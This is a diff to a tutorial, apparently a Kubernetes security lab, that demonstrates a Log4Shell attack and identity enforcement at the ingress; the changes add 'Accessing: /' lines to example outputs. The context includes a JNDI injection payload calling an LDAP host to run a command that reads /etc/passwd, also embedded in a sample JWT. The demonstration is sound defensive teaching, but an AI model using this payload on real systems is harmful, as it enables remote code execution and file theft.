@@ -36,6 +36,7 @@ You will see something like this:
 
 ```
 Welcome, anonymous!
+Accessing: /
 ```
 
 ## 2. Enforce user identities
@@ -62,6 +63,7 @@ see something like:
 
 ```
 Welcome, Ignasi!
+Accessing: /
 
 
 Authenticated with token:
@@ -80,6 +82,7 @@ the ingress. We can check it by launching a new pod and accessing the app as fol
 $ kubectl run tmp-shell --rm -i --tty --image nicolaka/netshoot -- /bin/bash
 bash-5.1# curl http://vulnerable:8080
 Welcome, anonymous!
+Accessing: /
 bash-5.1# exit
 ```
 
@@ -118,6 +121,7 @@ demonstrate the attach, let's inject some malicious payloads in the token by set
   output:
   ```
   Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
+  Accessing: /
   
   Authenticated with token:
   eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkRGRWVyODZqY2lRQTNfUVdETkE3MyJ9.eyJuaWNrbmFtZSI6ImlnbmFzaSt0ZXN0IiwibmFtZSI6IiR7am5kaTpsZGFwOi8vbG9nNHNoZWxsOjEzODkvZXhlYy9ZMkYwSUM5bGRHTXZjR0Z6YzNka0NnPT19IiwicGljdHVyZSI6Imh0dHBzOi8vcy5ncmF2YXRhci5jb20vYXZhdGFyLzA0NGMyNTUwOTg0MTYzYzk5NDc3Y2QzZDJiNjQ1ZWI0P3M9NDgwJnI9cGcmZD1odHRwcyUzQSUyRiUyRmNkbi5hdXRoMC5jb20lMkZhdmF0YXJzJTJGaWcucG5nIiwidXBkYXRlZF9hdCI6IjIwMjItMDEtMjRUMDg6MjM6NDguODY5WiIsImVtYWlsIjoiaWduYXNpK3Rlc3RAdGV0cmF0ZS5pbyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL25hY3gtZG16LmV1LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw2MWU3ZjQ1YTc2ZGMzYTAwNmFhZTUwZGIiLCJhdWQiOiJkeXlXMG1lNExxOG4zdFkzMEZhdHVEUUZYcHRadm00byIsImlhdCI6MTY0MzAxMjYyOSwiZXhwIjoxNjQzMDQ4NjI5LCJub25jZSI6IlQ5c2Q2LTZsNDlNVGRkUXFOLVJkeEplYmMwS1VsNk1OOVJmRWtkMVZVWjgifQ.FUi8ydGHDksc_B6YfmE-xCmSvdfOtroxJ5MOp5aern-JK3Qrcm0lYo4NNcxRdDg65AbS93hklexBRLBzfTd5B8jopiyzqmznMtafxV9rrH_ZS2-oBrfc-soLQf0r9d8T0tTnnidtfAbPSwNyv5zKiFHXxHGHoX-x6wjZahCt-pKk4uoCdTDGgCp2751yXF1FJSLcC8v8kiSC9lZhm7xJxVFvP19zZ30PadD9b_QOu3Xs-yOz2LxCXCXImQZvfuCV2YFOvVGimfKz35WeEf5RAeJZkxoHN6G3oXnbEwgIAdAl6r68Gj2LUbloy8XvKgJk7IIcsSlAwETiiPWdemP3ag
